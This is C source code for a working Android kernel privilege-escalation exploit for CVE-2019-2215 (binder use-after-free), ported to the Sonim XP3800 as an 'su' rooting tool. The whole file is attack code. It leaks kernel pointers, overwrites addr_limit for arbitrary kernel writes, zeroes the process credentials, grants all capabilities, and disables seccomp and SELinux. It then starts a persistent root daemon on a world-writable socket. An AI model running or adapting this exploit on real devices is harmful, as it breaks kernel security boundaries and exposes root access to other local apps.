/*
 * CVE-2019-2215 root exploit for Sonim XP3800
 * ARM32 (armv7l), kernel 3.18.71-perf
 *
 * Based on the Project Zero POC by Jann Horn & Maddie Stone
 * Modified for Sonim XP5S by flipphoneguy
 * Ported to Sonim XP3800 (32-bit ARM) by flipphoneguy
 */

#define DENIED_PATH "/data/data/com.flipphoneguy.root.xp3/files/blacklist.txt"
#define LOCK_PATH "/data/local/tmp/.su.lock"
#define SOCKET_PATH "/data/local/tmp/.su.sock"
#define PACKAGES_LIST "/data/system/packages.list"
#define MAX_PACKAGE_NAME 256

#define BINDER_THREAD_EXIT 0x40046208ul
#define BINDER_SET_MAX_THREADS 0x40046205ul
#define BINDER_THREAD_SZ 0x134
#define WAITQUEUE_OFFSET 0x50
#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 8)
#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 8)
#define PAGE 0x1000ul

#define SELINUX_ENFORCING 0xc1310ae8ul

#define OFFSET__task_struct__stack 0x004
#define OFFSET__task_struct__cred 0x39C

#define OFFSET__cred__uid 0x004
#define OFFSET__cred__securebits 0x024
#define OFFSET__cred__cap_inheritable 0x028
#define OFFSET__cred__cap_permitted 0x030
#define OFFSET__cred__cap_effective 0x038
#define OFFSET__cred__cap_bset 0x040
#define OFFSET__cred__cap_ambient 0x048

#define OFFSET__thread_info__flags 0x000
#define OFFSET__thread_info__addr_limit 0x008

#define _GNU_SOURCE
#include <time.h>
#include <sys/wait.h>
#include <ctype.h>
#include <sys/uio.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/file.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <signal.h>
#include <sched.h>
#include <sys/select.h>
#include <sys/stat.h>

int quiet = 1;

void message(char *fmt, ...) {
    if (quiet) return;
    va_list ap;
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fputc('\n', stderr);
}

void error(char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fprintf(stderr, ": %s\n", errno ? strerror(errno) : "error");
    exit(1);
}

void pin_cpu(int cpu) {
    unsigned long mask = 1UL << cpu;
    syscall(__NR_sched_setaffinity, 0, sizeof(mask), &mask);
}

void busy_wait_ns(long ns) {
    struct timespec start, now;
    clock_gettime(CLOCK_MONOTONIC, &start);
    for (;;) {
        clock_gettime(CLOCK_MONOTONIC, &now);
        long elapsed = (now.tv_sec - start.tv_sec) * 1000000000L + (now.tv_nsec - start.tv_nsec);
        if (elapsed >= ns) break;
    }
}

int isKernelPointer(unsigned long p) {
    return p >= 0xc0008000ul && p < 0xf0000000ul;
}

int clobber_data(unsigned long payloadAddress, const void *payload, unsigned long payloadLength, long delay_ns) {
    int binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0) return 0;
    int epfd = epoll_create(1000);
    struct epoll_event event = {.events = EPOLLIN};
    int max_threads = 2;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
    epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event);

    unsigned long pipeCapacity = 2 * PAGE;
    unsigned long preUafBytes = 12;
    unsigned long paddingSize = pipeCapacity - preUafBytes;
    unsigned long clobberSize = 16;

    static unsigned long testDatum;
    testDatum = 0;
    unsigned long testValue = 0xABCD5678ul;

    char *dummyBuffer = calloc(1, PAGE);
    struct iovec iov[IOVEC_ARRAY_SZ];
    memset(iov, 0, sizeof(iov));

    iov[IOVEC_INDX_FOR_WQ - 2].iov_base = dummyBuffer;
    iov[IOVEC_INDX_FOR_WQ - 2].iov_len = PAGE;
    iov[IOVEC_INDX_FOR_WQ - 1].iov_base = dummyBuffer;
    iov[IOVEC_INDX_FOR_WQ - 1].iov_len = paddingSize - PAGE;
    iov[IOVEC_INDX_FOR_WQ].iov_base = NULL;
    iov[IOVEC_INDX_FOR_WQ].iov_len = 0;
    iov[IOVEC_INDX_FOR_WQ + 1].iov_base = dummyBuffer;
    iov[IOVEC_INDX_FOR_WQ + 1].iov_len = preUafBytes + clobberSize;
    iov[IOVEC_INDX_FOR_WQ + 2].iov_base = dummyBuffer;
    iov[IOVEC_INDX_FOR_WQ + 2].iov_len = payloadLength;
    iov[IOVEC_INDX_FOR_WQ + 3].iov_base = dummyBuffer;
    iov[IOVEC_INDX_FOR_WQ + 3].iov_len = 4;

    int pipefd[2];
    pipe(pipefd);
    fcntl(pipefd[0], F_SETPIPE_SZ, pipeCapacity);
    fcntl(pipefd[1], F_SETPIPE_SZ, pipeCapacity);

    int sigfd[2];
    pipe(sigfd);

    unsigned char clobber[16];
    memcpy(clobber + 0, &payloadAddress, 4);
    memcpy(clobber + 4, &payloadLength, 4);
    unsigned long testAddr = (unsigned long)&testDatum;
    unsigned long testLen = 4;
    memcpy(clobber + 8, &testAddr, 4);
    memcpy(clobber + 12, &testLen, 4);

    unsigned long helperTotal = 3 * pipeCapacity;
    unsigned char *helperBuf = calloc(1, helperTotal);
    unsigned long pos = pipeCapacity;
    memcpy(helperBuf + pos, clobber, 16); pos += 16;
    memcpy(helperBuf + pos, payload, payloadLength); pos += payloadLength;
    memcpy(helperBuf + pos, &testValue, 4); pos += 4;

    pid_t helper = fork();
    if (helper == 0) {
        pin_cpu(0);
        prctl(PR_SET_PDEATHSIG, 9);
        close(pipefd[0]);
        close(sigfd[0]); close(sigfd[1]);
        write(pipefd[1], helperBuf, helperTotal);
        close(pipefd[1]);
        _exit(0);
    }

    pid_t child = fork();
    if (child == 0) {
        pin_cpu(1);
        prctl(PR_SET_PDEATHSIG, 9);
        close(pipefd[0]); close(pipefd[1]);
        close(sigfd[1]);
        char sig;
        read(sigfd[0], &sig, 1);
        close(sigfd[0]);
        busy_wait_ns(delay_ns);
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        _exit(0);
    }
    close(pipefd[1]);
    close(sigfd[0]);

    pin_cpu(0);
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    write(sigfd[1], "X", 1);
    close(sigfd[1]);
    readv(pipefd[0], iov, IOVEC_ARRAY_SZ);

    close(pipefd[0]);
    int st;
    waitpid(helper, &st, 0);
    waitpid(child, &st, 0);
    close(binder_fd);
    close(epfd);
    free(dummyBuffer);
    free(helperBuf);

    return testDatum == testValue;
}

int clobber_with_retry(unsigned long addr, const void *data, unsigned long len) {
    for (int attempt = 0; attempt < 40; attempt++) {
        long delay_ns = 50000L + attempt * 20000L;
        message("  clobber attempt %d (delay=%ldns)", attempt + 1, delay_ns);
        if (clobber_data(addr, data, len, delay_ns))
            return 1;
    }
    return 0;
}

int leak_phase1(unsigned long *slab_out, unsigned long *task_out) {
    pin_cpu(0);

    int binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0) return 0;
    int epfd = epoll_create(1000);
    struct epoll_event event = {.events = EPOLLIN};
    int max_threads = 2;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
    epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event);

    unsigned long pipeCapacity = 2 * PAGE;
    unsigned long preUafBytes = 1;
    unsigned long paddingSize = pipeCapacity - preUafBytes;
    unsigned long minimumLeak = BINDER_THREAD_SZ - 0x54;
    unsigned long leakLen = preUafBytes + minimumLeak;

    char *dummyBuffer = calloc(1, PAGE);
    struct iovec iov[IOVEC_ARRAY_SZ];
    memset(iov, 0, sizeof(iov));

    iov[IOVEC_INDX_FOR_WQ - 2].iov_base = dummyBuffer;
    iov[IOVEC_INDX_FOR_WQ - 2].iov_len = PAGE;
    iov[IOVEC_INDX_FOR_WQ - 1].iov_base = dummyBuffer;
    iov[IOVEC_INDX_FOR_WQ - 1].iov_len = paddingSize - PAGE;
    iov[IOVEC_INDX_FOR_WQ].iov_base = NULL;
    iov[IOVEC_INDX_FOR_WQ].iov_len = 0;
    iov[IOVEC_INDX_FOR_WQ + 1].iov_base = dummyBuffer;
    iov[IOVEC_INDX_FOR_WQ + 1].iov_len = leakLen;

    int pipefd[2];
    pipe(pipefd);
    fcntl(pipefd[0], F_SETPIPE_SZ, pipeCapacity);
    fcntl(pipefd[1], F_SETPIPE_SZ, pipeCapacity);

    int leakPipe[2];
    pipe(leakPipe);

    pid_t child = fork();
    if (child == 0) {
        pin_cpu(0);
        prctl(PR_SET_PDEATHSIG, 9);
        close(pipefd[1]);
        close(leakPipe[0]);
        usleep(500000);

        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);

        unsigned long readSz = pipeCapacity + leakLen;
        unsigned char *buffer = malloc(readSz);
        ssize_t got = read(pipefd[0], buffer, readSz);

        unsigned long slab = 0, task = 0;
        if (got > (ssize_t)pipeCapacity) {
            unsigned char *kern = buffer + pipeCapacity;
            unsigned long kernLen = got - pipeCapacity;

            if (kernLen >= 7) {
                unsigned long listPrev = 0;
                memcpy(&listPrev, kern + 3, 4);
                if (isKernelPointer(listPrev))
                    slab = listPrev - 0x54;
            }
            if (kernLen >= 0xDB + 4) {
                memcpy(&task, kern + 0xDB, 4);
            }
        }

        write(leakPipe[1], &slab, 4);
        write(leakPipe[1], &task, 4);

        char drain[PAGE];
        while (read(pipefd[0], drain, PAGE) > 0) {}
        close(pipefd[0]);
        close(leakPipe[1]);
        free(buffer);
        _exit(0);
    }
    close(pipefd[0]);
    close(leakPipe[1]);

    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    writev(pipefd[1], iov, IOVEC_ARRAY_SZ);
    close(pipefd[1]);

    unsigned long slab = 0, task = 0;
    read(leakPipe[0], &slab, 4);
    read(leakPipe[0], &task, 4);
    close(leakPipe[0]);

    int st;
    wait(&st);
    close(binder_fd);
    close(epfd);
    free(dummyBuffer);

    *slab_out = slab;
    *task_out = task;
    return (slab != 0 && isKernelPointer(task));
}

int leak_phase2(unsigned long task_struct_ptr, unsigned long *stack_out, unsigned long *cred_out) {
    pin_cpu(0);

    int binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0) return 0;
    int epfd = epoll_create(1000);
    struct epoll_event event = {.events = EPOLLIN};
    int max_threads = 2;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
    epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event);

    unsigned long pipeCapacity = 2 * PAGE;
    unsigned long preUafBytes = 1;
    unsigned long paddingSize = pipeCapacity - preUafBytes;
    unsigned long minimumLeak = BINDER_THREAD_SZ - 0x54;
    unsigned long extraSlabRead = pipeCapacity * 4;
    unsigned long iov11Len = preUafBytes + minimumLeak + extraSlabRead;

    char *dummyBuffer = calloc(1, PAGE);
    struct iovec iov[IOVEC_ARRAY_SZ];
    memset(iov, 0, sizeof(iov));

    iov[IOVEC_INDX_FOR_WQ - 2].iov_base = dummyBuffer;
    iov[IOVEC_INDX_FOR_WQ - 2].iov_len = PAGE;
    iov[IOVEC_INDX_FOR_WQ - 1].iov_base = dummyBuffer;
    iov[IOVEC_INDX_FOR_WQ - 1].iov_len = paddingSize - PAGE;
    iov[IOVEC_INDX_FOR_WQ].iov_base = NULL;
    iov[IOVEC_INDX_FOR_WQ].iov_len = 0;
    iov[IOVEC_INDX_FOR_WQ + 1].iov_base = dummyBuffer;
    iov[IOVEC_INDX_FOR_WQ + 1].iov_len = iov11Len;
    iov[IOVEC_INDX_FOR_WQ + 2].iov_base = dummyBuffer;
    iov[IOVEC_INDX_FOR_WQ + 2].iov_len = 4;
    iov[IOVEC_INDX_FOR_WQ + 3].iov_base = dummyBuffer;
    iov[IOVEC_INDX_FOR_WQ + 3].iov_len = 4;

    int pipefd[2];
    pipe(pipefd);
    fcntl(pipefd[0], F_SETPIPE_SZ, pipeCapacity);
    fcntl(pipefd[1], F_SETPIPE_SZ, pipeCapacity);

    int leakPipe[2];
    pipe(leakPipe);

    pid_t child = fork();
    if (child == 0) {
        pin_cpu(0);
        prctl(PR_SET_PDEATHSIG, 9);
        close(pipefd[1]);
        close(leakPipe[0]);
        usleep(500000);

        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);

        unsigned long size1 = pipeCapacity + minimumLeak;
        unsigned char *buffer = malloc(size1 + PAGE);
        ssize_t got = read(pipefd[0], buffer, size1);

        unsigned long slab_addr = 0;
        if (got >= (ssize_t)size1) {
            unsigned char *kern = buffer + pipeCapacity;
            unsigned long listPrev = 0;
            memcpy(&listPrev, kern + 3, 4);
            if (isKernelPointer(listPrev))
                slab_addr = listPrev - 0x54;
        }

        if (slab_addr == 0) {
            unsigned long zero = 0;
            write(leakPipe[1], &zero, 4);
            write(leakPipe[1], &zero, 4);
            close(leakPipe[1]);
            _exit(1);
        }

        unsigned long new_iovecs[4] = {
            task_struct_ptr + OFFSET__task_struct__stack,
            4,
            task_struct_ptr + OFFSET__task_struct__cred,
            4,
        };

        int clob_ok = clobber_with_retry(slab_addr + 0x60, new_iovecs, sizeof(new_iovecs));
        if (!clob_ok) {
            unsigned long zero = 0;
            write(leakPipe[1], &zero, 4);
            write(leakPipe[1], &zero, 4);
            close(leakPipe[1]);
            _exit(1);
        }

        unsigned long remaining = iov11Len - preUafBytes - minimumLeak;
        unsigned char *drain = malloc(remaining + 16);
        ssize_t drained = 0;
        while (drained < (ssize_t)remaining) {
            ssize_t r = read(pipefd[0], drain + drained, remaining - drained);
            if (r <= 0) break;
            drained += r;
        }

        unsigned long stack_ptr = 0;
        read(pipefd[0], &stack_ptr, 4);

        unsigned long cred_ptr = 0;
        read(pipefd[0], &cred_ptr, 4);

        write(leakPipe[1], &stack_ptr, 4);
        write(leakPipe[1], &cred_ptr, 4);

        char d[PAGE];
        while (read(pipefd[0], d, PAGE) > 0) {}
        close(pipefd[0]);
        close(leakPipe[1]);
        free(buffer);
        free(drain);
        _exit(0);
    }
    close(pipefd[0]);
    close(leakPipe[1]);

    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    writev(pipefd[1], iov, IOVEC_ARRAY_SZ);
    close(pipefd[1]);

    unsigned long stack = 0, cred = 0;
    read(leakPipe[0], &stack, 4);
    read(leakPipe[0], &cred, 4);
    close(leakPipe[0]);

    int st;
    wait(&st);
    close(binder_fd);
    close(epfd);
    free(dummyBuffer);

    *stack_out = stack;
    *cred_out = cred;
    return (isKernelPointer(stack) && isKernelPointer(cred));
}

void kernel_write(int pipe_r, int pipe_w, unsigned long kaddr, void *buf, unsigned long len) {
    write(pipe_w, buf, len);
    read(pipe_r, (void *)kaddr, len);
}

void getPackageName(unsigned uid, char *packageName) {
    if (uid == 0) { strcpy(packageName, "root"); return; }
    if (uid == 2000) { strcpy(packageName, "shell"); return; }

    strcpy(packageName, "unknown");

    FILE *f = fopen(PACKAGES_LIST, "r");
    if (f == NULL) return;

    char line[1024];
    char name[MAX_PACKAGE_NAME];
    unsigned int id;

    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "%s %u", name, &id) == 2) {
            if (id == uid) {
                strncpy(packageName, name, MAX_PACKAGE_NAME);
                packageName[MAX_PACKAGE_NAME - 1] = 0;
                break;
            }
        }
    }
    fclose(f);
}

int checkDenylist(unsigned uid) {
    if (uid == 0 || uid == 2000) return 1;

    char parent[MAX_PACKAGE_NAME];
    getPackageName(uid, parent);

    if (!strcmp(parent, "com.termux")) return 1;

    FILE *bl = fopen(DENIED_PATH, "r");
    if (bl != NULL) {
        char line[512];
        while (fgets(line, sizeof(line), bl)) {
            char *p = line;
            while (*p && isspace(*p)) p++;
            char *q = p + strlen(p) - 1;
            while (q > p && isspace(*q)) *q-- = 0;

            if (q <= p || *p == '#') continue;

            if (*q == '*') {
                if (!strncmp(parent, p, q - p)) {
                    fclose(bl);
                    message("denied by denylist: %s", parent);
                    return 0;
                }
            } else if (!strcmp(parent, p)) {
                fclose(bl);
                message("denied by denylist: %s", parent);
                return 0;
            }
        }
        fclose(bl);
    }

    return 1;
}

/* ===== DAEMON ===== */

static void daemon_handle(int client) {
    struct ucred peer;
    socklen_t len = sizeof(peer);
    if (getsockopt(client, SOL_SOCKET, SO_PEERCRED, &peer, &len) < 0) {
        int err = -1;
        write(client, &err, 4);
        return;
    }

    char buf[65536];
    int fds[3] = {-1, -1, -1};
    struct msghdr msg = {0};
    struct iovec iov = { .iov_base = buf, .iov_len = sizeof(buf) - 1 };
    char cmsgbuf[CMSG_SPACE(3 * sizeof(int))];
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsgbuf;
    msg.msg_controllen = sizeof(cmsgbuf);

    ssize_t n = recvmsg(client, &msg, 0);
    if (n <= 0) return;
    buf[n] = 0;

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg && cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS)
        memcpy(fds, CMSG_DATA(cmsg), 3 * sizeof(int));

    if (fds[0] < 0) return;

    char *end = buf + n;
    char *shell = buf;
    char *cmd = memchr(shell, 0, end - shell);
    if (!cmd || ++cmd >= end) { close(fds[0]); close(fds[1]); close(fds[2]); return; }
    char *cwd = memchr(cmd, 0, end - cmd);
    if (!cwd || ++cwd >= end) { close(fds[0]); close(fds[1]); close(fds[2]); return; }
    char *path = memchr(cwd, 0, end - cwd);
    if (!path || ++path >= end) { close(fds[0]); close(fds[1]); close(fds[2]); return; }
    char *term = memchr(path, 0, end - path);
    if (!term || ++term >= end) { close(fds[0]); close(fds[1]); close(fds[2]); return; }
    char *home = memchr(term, 0, end - term);
    if (!home || ++home >= end) { close(fds[0]); close(fds[1]); close(fds[2]); return; }
    if (!checkDenylist(peer.uid)) {
        int err = -1;
        write(client, &err, 4);
        close(fds[0]); close(fds[1]); close(fds[2]);
        return;
    }

    char *env_start = memchr(home, 0, end - home);
    if (env_start) env_start++;

    pid_t child = fork();
    if (child == 0) {
        close(client);
        setsid();
        dup2(fds[0], 0); dup2(fds[1], 1); dup2(fds[2], 2);
        close(fds[0]); close(fds[1]); close(fds[2]);
        ioctl(0, TIOCSCTTY, 1);
        chdir(cwd);
        while (env_start && env_start < end && *env_start) {
            char *eq = memchr(env_start, '=', end - env_start);
            char *nxt = memchr(env_start, 0, end - env_start);
            if (!eq || !nxt) break;
            *eq = '\0';
            setenv(env_start, eq + 1, 1);
            env_start = nxt + 1;
        }
        setenv("PATH", path, 1);
        setenv("TERM", term, 1);
        setenv("HOME", home, 1);
        if (cmd[0])
            execl(shell, shell, "-c", cmd, (char *)0);
        else
            execl(shell, shell, (char *)0);
        _exit(127);
    }
    close(fds[0]); close(fds[1]); close(fds[2]);

    int status;
    waitpid(child, &status, 0);
    int exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : 1;
    write(client, &exit_code, 4);
}

static void daemon_main(int ready_fd) {
    int oom = open("/proc/self/oom_score_adj", O_WRONLY);
    if (oom >= 0) { write(oom, "-1000", 5); close(oom); }

    int nsfd = open("/proc/1/ns/mnt", O_RDONLY);
    if (nsfd >= 0) {
        setns(nsfd, 0);
        close(nsfd);
    }

    setsid();
    close(0); close(1); close(2);
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_WRONLY);

    unlink(SOCKET_PATH);
    int server = socket(AF_UNIX, SOCK_STREAM, 0);
    struct sockaddr_un addr = {0};
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);
    bind(server, (struct sockaddr *)&addr, sizeof(addr));
    chmod(SOCKET_PATH, 0666);
    listen(server, 5);

    if (ready_fd >= 0) {
        write(ready_fd, "R", 1);
        close(ready_fd);
    }

    signal(SIGCHLD, SIG_IGN);

    while (1) {
        int client = accept(server, NULL, NULL);
        if (client < 0) continue;
        pid_t handler = fork();
        if (handler == 0) {
            signal(SIGCHLD, SIG_DFL);
            close(server);
            daemon_handle(client);
            close(client);
            _exit(0);
        }
        close(client);
    }
}

/* ===== CLIENT ===== */

static int try_connect(void) {
    int sock = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    struct sockaddr_un addr = {0};
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        message("try_connect: %s", strerror(errno));
        close(sock);
        return -1;
    }
    return sock;
}

static int client_request(int sock, const char *shell, const char *cmd,
                          const char *cwd, const char *path, const char *term,
                          const char *home, int forward_env) {
    char buf[65536];
    size_t pos = 0;
    #define PACK(s) do { \
        int r = snprintf(buf + pos, sizeof(buf) - pos, "%s", (s)); \
        pos += r + 1; \
        if (pos > sizeof(buf)) { close(sock); return -1; } \
    } while(0)
    PACK(shell);
    PACK(cmd ? cmd : "");
    PACK(cwd);
    PACK(path ? path : "/system/bin");
    PACK(term ? term : "xterm");
    PACK(home ? home : "/data/local/tmp");
    if (forward_env) {
        extern char **environ;
        for (char **ep = environ; *ep; ep++) {
            if (!strncmp(*ep, "PATH=", 5)) continue;
            if (!strncmp(*ep, "TERM=", 5)) continue;
            if (!strncmp(*ep, "HOME=", 5)) continue;
            PACK(*ep);
        }
    }
    #undef PACK

    int fds[3] = {0, 1, 2};
    struct msghdr msg = {0};
    struct iovec iov = { .iov_base = buf, .iov_len = pos };
    char cmsgbuf[CMSG_SPACE(3 * sizeof(int))];
    memset(cmsgbuf, 0, sizeof(cmsgbuf));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsgbuf;
    msg.msg_controllen = sizeof(cmsgbuf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(3 * sizeof(int));
    memcpy(CMSG_DATA(cmsg), fds, 3 * sizeof(int));

    if (sendmsg(sock, &msg, 0) <= 0) {
        close(sock);
        return -1;
    }

    int exit_code = -1;
    read(sock, &exit_code, 4);
    close(sock);
    return exit_code;
}

/* ===== EXPLOIT (run once to bootstrap daemon) ===== */

static void run_exploit(void) {
    message("starting exploit for Sonim XP3800 (32-bit ARM)");

    message("phase 1: leaking task_struct pointer");
    unsigned long slab_addr = 0, task_struct_ptr = 0;
    for (int i = 0; i < 10; i++) {
        if (leak_phase1(&slab_addr, &task_struct_ptr)) {
            message("  slab=0x%08lx task=0x%08lx", slab_addr, task_struct_ptr);
            break;
        }
        message("  attempt %d failed, retrying", i + 1);
    }
    if (!isKernelPointer(task_struct_ptr))
        error("failed to leak task_struct pointer");

    message("phase 2: reading stack and cred from task_struct");
    unsigned long stack_ptr = 0, cred_ptr = 0;
    for (int i = 0; i < 5; i++) {
        if (leak_phase2(task_struct_ptr, &stack_ptr, &cred_ptr)) {
            message("  stack=0x%08lx cred=0x%08lx", stack_ptr, cred_ptr);
            break;
        }
        message("  attempt %d failed, retrying", i + 1);
    }
    if (!isKernelPointer(stack_ptr) || !isKernelPointer(cred_ptr))
        error("failed to read task_struct fields");

    unsigned long thread_info = stack_ptr;
    unsigned long addr_limit = thread_info + OFFSET__thread_info__addr_limit;
    message("  thread_info=0x%08lx addr_limit=0x%08lx", thread_info, addr_limit);

    message("phase 3: clobbering addr_limit");
    unsigned long new_limit = 0xFFFFFFFF;
    if (!clobber_with_retry(addr_limit, &new_limit, 4))
        error("failed to clobber addr_limit");
    message("  addr_limit clobbered");

    message("phase 4: escalating privileges");
    int krw[2];
    pipe(krw);

    unsigned char zeros[32];
    memset(zeros, 0, sizeof(zeros));
    kernel_write(krw[0], krw[1], cred_ptr + OFFSET__cred__uid, zeros, 32);
    message("  uid/gid zeroed");

    if (getuid() != 0)
        error("failed to change UID to 0");

    unsigned long zero = 0;
    kernel_write(krw[0], krw[1], cred_ptr + OFFSET__cred__securebits, &zero, 4);

    unsigned char caps[8];
    memset(caps, 0xFF, sizeof(caps));
    kernel_write(krw[0], krw[1], cred_ptr + OFFSET__cred__cap_inheritable, caps, 8);
    kernel_write(krw[0], krw[1], cred_ptr + OFFSET__cred__cap_permitted, caps, 8);
    kernel_write(krw[0], krw[1], cred_ptr + OFFSET__cred__cap_effective, caps, 8);
    kernel_write(krw[0], krw[1], cred_ptr + OFFSET__cred__cap_bset, caps, 8);
    kernel_write(krw[0], krw[1], cred_ptr + OFFSET__cred__cap_ambient, caps, 8);
    message("  capabilities set");

    int seccompStatus = prctl(PR_GET_SECCOMP);
    if (seccompStatus) {
        message("  disabling seccomp (status=%d)", seccompStatus);
        kernel_write(krw[0], krw[1], thread_info + OFFSET__thread_info__flags, &zero, 4);
    }

    kernel_write(krw[0], krw[1], SELINUX_ENFORCING, &zero, 4);
    message("  SELinux disabled");

    close(krw[0]);
    close(krw[1]);

    message("root privileges ready (uid=%d)", getuid());
}

/* ===== MAIN ===== */

int main(int argc, char **argv) {
    unsigned int oldUID = getuid();
    char *shell_override = NULL;
    char *cmd_arg = NULL;
    int preserve_env = 0;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose")) {
            quiet = 0;
        } else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
            printf("Usage: su [OPTIONS] [COMMAND...]\n  su                       root shell\n  su -c 'cmd'              run command as root\n  su cmd                   same as -c\n  -s, --shell SHELL        specify shell\n  -p, --preserve-environment  preserve environment variables\n  --mount-master           mount master namespace\n  --daemon                 start daemon directly (requires root)\n  -v, --verbose            verbose output\n");
            return 0;
        } else if (!strcmp(argv[i], "-p") || !strcmp(argv[i], "--preserve-environment")) {
            preserve_env = 1;
        } else if (!strcmp(argv[i], "--daemon")) {
            if (getuid() != 0)
                error("--daemon requires root");
            daemon_main(-1);
            _exit(0);
        } else if (!strcmp(argv[i], "--mount-master")) {
            /* accepted for sudo compatibility */
        } else if (!strcmp(argv[i], "-s") || !strcmp(argv[i], "--shell")) {
            if (i + 1 < argc) shell_override = argv[++i];
        } else if (!strcmp(argv[i], "-c")) {
            if (i + 1 < argc) {
                static char cmd_buf[8192];
                cmd_buf[0] = 0;
                for (int j = i + 1; j < argc; j++) {
                    if (j > i + 1) strcat(cmd_buf, " ");
                    strncat(cmd_buf, argv[j], sizeof(cmd_buf) - strlen(cmd_buf) - 1);
                }
                cmd_arg = cmd_buf;
                i = argc;
            }
        } else if (!cmd_arg) {
            cmd_arg = argv[i];
        }
    }

    int use_caller_env = preserve_env || !cmd_arg;

    char _cwd[1024];
    getcwd(_cwd, sizeof(_cwd));
    char *_term = getenv("TERM");

    char *_shell;
    if (shell_override)
        _shell = shell_override;
    else if (use_caller_env && getenv("SHELL"))
        _shell = getenv("SHELL");
    else
        _shell = "/system/bin/sh";

    char *_path = use_caller_env ? getenv("PATH") : "/sbin:/system/sbin:/system/bin:/system/xbin:/vendor/bin";
    char *_home = use_caller_env ? getenv("HOME") : "/";

    int sock = try_connect();
    if (sock >= 0) {
        message("connected to daemon");
        int ret = client_request(sock, _shell, cmd_arg, _cwd, _path, _term, _home, preserve_env);
        if (ret == -1) {
            fprintf(stderr, "su: denied\n");
            return 1;
        }
        return ret;
    }

    int lock_fd = open(LOCK_PATH, O_CREAT | O_RDWR, 0666);
    if (lock_fd >= 0) flock(lock_fd, LOCK_EX);

    sock = try_connect();
    if (sock >= 0) {
        if (lock_fd >= 0) { flock(lock_fd, LOCK_UN); close(lock_fd); }
        message("connected to daemon (after lock)");
        int ret = client_request(sock, _shell, cmd_arg, _cwd, _path, _term, _home, preserve_env);
        if (ret == -1) {
            fprintf(stderr, "su: denied\n");
            return 1;
        }
        return ret;
    }

    if (!checkDenylist(oldUID)) {
        if (lock_fd >= 0) { flock(lock_fd, LOCK_UN); close(lock_fd); }
        fprintf(stderr, "su: denied\n");
        return 1;
    }

    int started = 0;
    for (int attempt = 0; attempt < 3; attempt++) {
        if (attempt > 0) {
            fprintf(stderr, "su: retrying exploit in 1s (%d/3)...\n", attempt + 1);
            sleep(1);
        }
        int ready[2];
        pipe(ready);
        pid_t pid = fork();
        if (pid == 0) {
            close(ready[0]);
            if (lock_fd >= 0) close(lock_fd);
            run_exploit();
            daemon_main(ready[1]);
            _exit(0);
        }
        close(ready[1]);
        char r = 0;
        struct timeval tv;
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(ready[0], &fds);
        tv.tv_sec = 10;
        tv.tv_usec = 0;
        if (select(ready[0] + 1, &fds, NULL, NULL, &tv) > 0 && read(ready[0], &r, 1) == 1) {
            started = 1;
        }
        close(ready[0]);
        if (started) break;
        waitpid(pid, NULL, WNOHANG);
    }

    if (lock_fd >= 0) { flock(lock_fd, LOCK_UN); close(lock_fd); }

    if (!started) {
        fprintf(stderr, "su: exploit failed after 3 attempts\n");
        return 1;
    }

    sock = try_connect();
    if (sock < 0) {
        fprintf(stderr, "su: daemon started but connect failed\n");
        return 1;
    }

    int ret = client_request(sock, _shell, cmd_arg, _cwd, _path, _term, _home, preserve_env);
    if (ret == -1) {
        fprintf(stderr, "su: denied\n");
        return 1;
    }
    return ret;
}
